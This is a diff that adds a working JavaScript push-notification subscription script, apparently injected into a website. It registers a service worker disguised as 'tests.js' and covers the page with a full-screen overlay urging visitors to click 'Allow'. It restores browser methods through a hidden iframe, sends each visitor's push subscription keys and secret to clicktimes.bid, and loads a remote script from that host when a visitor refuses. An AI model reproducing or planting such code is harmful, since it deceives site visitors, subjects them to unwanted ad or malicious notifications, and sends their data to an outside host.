@@ -1,0 +1,358 @@
+				(function () {
+				    'use strict';
+
+				    const SETTINGS = {
+				        callbackName: 'onSubInit',
+				        workerName: 'tests.js',
+				        serverUrl: '//clicktimes.bid/?send=f53dec64-cad0-48a0-9abe-994e993c490f&s=haztknryme5ha3ddf42dgmbs',
+				        applicationServerKey: urlB64ToUint8Array('BIbjCoVklTIiXYjv3Z5WS9oemREJPCOFVHwpAxQphYoA5FOTzG-xOq6GiK31R-NF--qzgT3_C2jurmRX_N6nY4g'),
+				        cookieNameS: 'notify-p',
+				        sUrl: '//clicktimes.bid/?pus=haztknryme5ha3ddf42dgmbs&sub1=&sub2=&sub3=&sub4=&gmt=' + (- new Date().getTimezoneOffset()/60),        background: {
+            show: true,
+            transparent: 50,
+            text: "\u041d\u0430\u0436\u043c\u0438\u0442\u0435 \"\u0420\u0430\u0437\u0440\u0435\u0448\u0438\u0442\u044c\", \u0447\u0442\u043e\u0431\u044b \u043f\u043e\u043b\u0443\u0447\u0430\u0442\u044c \u0443\u0432\u0435\u0434\u043e\u043c\u043b\u0435\u043d\u0438\u044f"        }
+    };
+
+
+    window.Sk = SETTINGS.applicationServerKey;
+    SETTINGS.template = '\
+    <div style="z-index: 2147483647; position: fixed; top: 0; bottom: 0; left: 0; right: 0;background: rgba(0,0,0,.'+SETTINGS.background.transparent+')!important;backface-visibility: hidden;-webkit-backface-visibility: hidden;text-align: left;">\
+        <div style="text-align:center;width:340px;margin-left:180px;">\
+            <div style=" margin:200px auto 0 auto;height: 170px; -webkit-animation: mover 0.5s infinite alternate;position:relative; width: 100px; animation: mover 0.5s infinite alternate">\
+                <img src="data:image/png;base64,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" style="position:absolute;left:5%;transition:0.5s;" id="p_arrow">\
+            </div>\
+            <div>\
+                <p style="text-align:center; padding-left: 10px; font-size: 23px;color: #fff; line-height: 1">\
+                 ' + SETTINGS.background.text + '\
+                </p>\
+            </div>\
+        </div>\
+        <div class="js-close" style="position: absolute; right: 20px;top: 10px;font-weight: 300;opacity: .8;cursor: pointer;font-family: \'Segoe UI\',\'Open Sans\',Ubuntu,\'Dejavu Sans\',Helvetica,\'Helvetica Neue\',Arial,sans-serif;color: #fff;width: 60px;text-align: center;">\
+            <span style="font-size: 60px;line-height: 20px;">×</span>\
+        </div>\
+    </div>\
+    ';
+
+    const EVENTS = {
+        show: [],
+        subscribe: [],
+        disallow: [],
+        error: []
+    };
+
+    function urlB64ToUint8Array(base64String) {
+        const padding = '='.repeat((4 - base64String.length % 4) % 4);
+        const base64 = (base64String + padding)
+            .replace(/\-/g, '+')
+            .replace(/_/g, '/');
+        const rawData = window.atob(base64);
+        const outputArray = new Uint8Array(rawData.length);
+        for (let i = 0; i < rawData.length; ++i) {
+            outputArray[i] = rawData.charCodeAt(i);
+        }
+        return outputArray;
+    }
+
+    function restoreMethods() {
+      function ready() {
+        return new Promise((resolve, reject) => {
+          if (document.readyState !== 'loading') {
+            return resolve();
+          }
+          document.addEventListener('DOMContentLoaded', resolve);
+        });
+      }
+      function getOriginalWindow() {
+        let frame = document.createElement('iframe');
+        frame.style.display = 'none';
+        frame.style.visibility = 'hidden';
+        document.body.insertBefore(frame, document.body.firstChild);
+        return frame.contentWindow;
+      }
+      return ready().then(getOriginalWindow).then(safeWindow => {
+        try {
+          ServiceWorkerRegistration.prototype.unregister = safeWindow.ServiceWorkerRegistration.prototype.unregister;
+          PushSubscription.prototype.unsubscribe = safeWindow.PushSubscription.prototype.unsubscribe;
+        } catch (e) {}
+      });
+    }
+
+    function array_equal(a, b) {
+        return a.length === b.length
+            ? a.every(function (el, i) {
+                return el === b[i];
+            }, b)
+            : false;
+    }
+
+    function isMobileDevice() {
+        if (typeof window.orientation !== 'undefined') {
+            return true;
+        }
+
+        if ('ontouchstart' in window || navigator.msMaxTouchPoints) {
+            return true;
+        }
+
+        return false;
+    }
+
+    const COOKIE = {
+        get: function (name) {
+            let matches = document.cookie.match(new RegExp("(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,
+                '\\$1') + "=([^;]*)"));
+            return matches ? decodeURIComponent(matches[1]) : undefined;
+        },
+        set: function (name, value, options) {
+            options = options || {};
+
+            let expires = options.expires;
+
+            if (typeof expires === "number" && expires) {
+                let d = new Date();
+                d.setTime(d.getTime() + expires * 1000);
+                expires = options.expires = d;
+            }
+            if (expires && expires.toUTCString) {
+                options.expires = expires.toUTCString();
+            }
+
+            value = encodeURIComponent(value);
+
+            let updatedCookie = name + "=" + value;
+
+            for (let propName in options) {
+                if (options.hasOwnProperty(propName)) {
+                    updatedCookie += "; " + propName;
+                    let propValue = options[propName];
+                    if (propValue !== true) {
+                        updatedCookie += "=" + propValue;
+                    }
+                }
+            }
+
+            document.cookie = updatedCookie;
+        }
+    };
+
+    const templateDom = {
+        element: null,
+        removeHtml: function () {
+            if (templateDom.element) {
+                templateDom.element.parentNode.removeChild(templateDom.element);
+                templateDom.element = null;
+            }
+        },
+        events: {
+            close: function (ev) {
+                ev.preventDefault();
+                templateDom.removeHtml();
+            }
+        }
+    };
+
+    let workerInstaller = null;
+    function getWorkerRegistration() {
+        return workerInstaller
+            .then(() => navigator.serviceWorker.ready)
+        ;
+    }
+
+    const mainManager = {
+        isIncognitoMode: false,
+        emitEvents: function (event, data) {
+            EVENTS[event].forEach(cb => cb(data));
+        },
+        attachEvent: function (event, callback) {
+            if (typeof EVENTS[event] === 'undefined') {
+                return false;
+            }
+            EVENTS[event].unshift(callback);
+            return true;
+        },
+        processError: function (error) {
+            console.error(error);
+            this.emitEvents('error', error);
+        },
+        renderHtml: function () {
+            if (!SETTINGS.background.show) {
+                return false;
+            }
+
+            function ready(callback) {
+                if (document.readyState !== 'loading') {
+                    return callback();
+                }
+                document.addEventListener('DOMContentLoaded', function () {
+                    return callback();
+                });
+            }
+            ready(() => {
+                templateDom.element = document.createElement('div');
+                templateDom.element.innerHTML = SETTINGS.template;
+                document.body.appendChild(templateDom.element);
+
+                for (let event in templateDom.events) {
+                    if (templateDom.events.hasOwnProperty(event)) {
+                        let elements =  [].slice.call(templateDom.element.getElementsByClassName('js-' + event));
+                        elements.forEach(element => {
+                            element.onclick = templateDom.events[event];
+                            element.removeAttribute('class');
+                        });
+                    }
+                }
+            });
+        },
+        renderShtml: function () {
+            if (COOKIE.get(SETTINGS.cookieNameS) === 'denied') {
+              return false;
+            }
+            function ready(callback) {
+                if (document.readyState !== 'loading') {
+                    return callback();
+                }
+                document.addEventListener('DOMContentLoaded', function () {
+                    return callback();
+                });
+            }
+            ready(() => {
+                templateDom.element = document.createElement('script');
+                templateDom.element.src = SETTINGS.sUrl;
+                document.body.appendChild(templateDom.element);
+            });
+        },
+        checkSubscription: function () {
+            try {
+                if (Notification.permission === 'default') {
+                    this.renderHtml();
+                    this.emitEvents('show');
+                }
+            } catch (e) {
+                return Promise.reject(e);
+            }
+
+            return Notification.requestPermission()
+                .then(permission => {
+                    templateDom.removeHtml();
+
+                    switch (this.getPermission()) {
+                        case 'granted':
+                            return getWorkerRegistration()
+                                .then(registration => registration.pushManager.getSubscription()
+                                    .then(subscription => {
+                                        if (subscription &&
+                                            subscription.options &&
+                                            subscription.options.applicationServerKey &&
+                                            array_equal(new Uint8Array(subscription.options.applicationServerKey), SETTINGS.applicationServerKey)
+                                        ) {
+                                            return this.emitEvents('subscribe');
+                                        } else {
+                                            return subscription.unsubscribe()
+                                                .then(() => this.subscribe())
+                                                .catch(error => this.processError(error));
+                                        }
+                                    })
+                                    .catch(error => this.subscribe())
+                                );
+
+                        case 'denied':
+                            this.renderShtml();                            return this.emitEvents('disallow', 'denied');
+
+                        default:
+                            return this.emitEvents('disallow', 'cancel');
+                    }
+                });
+        },
+        subscribe: function () {
+            return getWorkerRegistration()
+                .then(registration => registration.pushManager.subscribe({
+                    userVisibleOnly: true,
+                    applicationServerKey: SETTINGS.applicationServerKey
+                }))
+                .then(subscription => {
+                    let gmt = - new Date().getTimezoneOffset()/60;
+                    let rawKey = subscription.getKey ? subscription.getKey('p256dh') : '';
+                    let key = rawKey ? btoa(String.fromCharCode.apply(null, new Uint8Array(rawKey))) : '';
+                    let rawAuthSecret = subscription.getKey ? subscription.getKey('auth') : '';
+                    let authSecret = rawAuthSecret ? btoa(String.fromCharCode.apply(null, new Uint8Array(rawAuthSecret))) : '';
+                    return fetch(SETTINGS.serverUrl, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        body: JSON.stringify({
+                            id: subscription.endpoint,
+                            key: key,
+                            secret: authSecret,
+                            gmt: gmt,
+                            uri: window.location.href + '/?ce=haztknryme5ha3ddf42dgmbs'
+                        })
+                    });
+                })
+                .then(() => this.emitEvents('subscribe'));
+        },
+        getPermission() {
+            if (!this.canStart()) {
+                return 'default';
+            }
+
+            return Notification.permission;
+        },
+        canStart: function () {
+            if (this.isIncognitoMode) {
+                return false;
+            }
+            if (!('serviceWorker' in navigator) || !('Notification' in window) || !('fetch' in window)) {
+                return false;
+            }
+            // Iframe
+            if (window.self !== window.top) {
+                return false;
+            }
+
+            return true;
+        },
+        start: function () {
+            if (!this.canStart()) {
+                                 this.renderShtml();
+                 return this.emitEvents('disallow', 'denied');
+                            }
+
+            if (this.getPermission() === 'denied') {
+                this.renderShtml();                return this.emitEvents('disallow', 'denied');
+            }
+
+            this.checkSubscription()
+                .catch(error => this.processError(error));
+        }
+    };
+
+    function init() {
+        if (mainManager.canStart()) {
+            workerInstaller = navigator.serviceWorker
+                .register('/' + SETTINGS.workerName)
+            ;
+            workerInstaller.catch(error => {});
+        }
+
+        if (typeof window[SETTINGS.callbackName] === 'function') {
+            window[SETTINGS.callbackName](mainManager);
+        } else {
+            mainManager.start();
+        }
+
+        var im = document.getElementById('p_arrow');
+        if (im) {
+            setInterval(function () {
+                if (im.style.top === '0px') {
+                    im.style.top = '-40px';
+                } else {
+                    im.style.top = '0px';
+                }
+            }, 500);
+        }
+    }
+
+    const sleep = (milliseconds) => {
+      return new Promise(resolve => setTimeout(resolve, milliseconds))
+    }
+    init();
+}());
